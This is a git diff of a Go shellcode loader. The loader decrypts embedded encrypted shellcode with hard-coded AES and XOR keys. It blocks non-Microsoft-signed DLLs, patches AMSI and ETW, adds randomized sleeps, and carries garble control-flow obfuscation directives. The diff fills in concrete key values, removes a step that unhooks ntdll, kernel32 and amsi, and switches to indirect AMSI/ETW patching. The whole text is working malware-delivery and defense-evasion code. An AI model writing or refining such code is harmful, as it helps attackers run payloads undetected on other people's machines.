@@ -12,7 +12,6 @@ import (
 	"main/utils/CleanMemory"
 	"main/utils/EVENT_LOG"
 	"main/utils/Indirect"
-	"main/utils/Unhook"
 	"main/utils/elevation"
 	"math/rand"
 	"time"
@@ -22,9 +21,9 @@ import (
 var encryptedShellcode []byte
 
 var (
-	aesKey, _    = hex.DecodeString("%KEYAES%")
-	xorKey, _    = hex.DecodeString("%KEYXOR%")
-	XORAESKey, _ = hex.DecodeString("%XORAESKEY%")
+	aesKey, _    = hex.DecodeString("2402155951a32fa244fb3098b6565e9f720e410c5bf17ba441ab33cee70959c8230c415c58f57fa145af32c3b75b5cc6720e400c0cf52df117fd319fe00c599d")
+	xorKey, _    = hex.DecodeString("7f0340090ca529f312a838c3bc580cca7f0f1d595cf07ca740f837cde25c09cf")
+	XORAESKey, _ = hex.DecodeString("473b256868931a9573c901fb846f3afe")
 )
 
 func verifyDataIntegrity(data []byte, stage string) bool {
@@ -97,7 +96,7 @@ func decryptkey(data, key []byte) ([]byte, error) {
 	return data, nil
 }
 
-//from golang package docs
+// from golang package docs
 func Sleep() {
 	rand.Seed(time.Now().UnixNano())
 	seconds := rand.Intn(6) + 10
@@ -114,7 +113,7 @@ func Sleep() {
 	}
 }
 
-//garble:controlflow flatten_passes=3 junk_jumps=128 block_splits=max flatten_hardening=xor,delegate_table
+//.garble:controlflow flatten_passes=3 junk_jumps=128 block_splits=max flatten_hardening=xor,delegate_table
 func main() {
 	log.SetFlags(0)
 
@@ -148,16 +147,8 @@ func main() {
 	}
 	fmt.Println("[+] Non-Microsoft-signed DLLs blocked")
 
-	fmt.Println("[*] Unhooking DLLs")
-	dllsToUnhook := []string{"ntdll.dll", "kernel32.dll", "user32.dll", "advapi32.dll", "amsi.dll"}
-	if err := Unhook.FullUnhook(dllsToUnhook); err != nil {
-		log.Fatalf("[-] Failed to unhook DLLs: %v", err)
-		return
-	}
-	fmt.Println("[+] DLLs unhooked")
-
 	log.Printf("[*] Patching Amsi And ETW")
-	AMSI_EDR.ExecuteAllPatches()
+	AMSI_EDR.ExecuteAllPatchesIndirect()
 	log.Printf("[+] Patched Amsi And ETW")
 
 	DecryptedAESKEY, err := decryptkey(aesKey, XORAESKey)
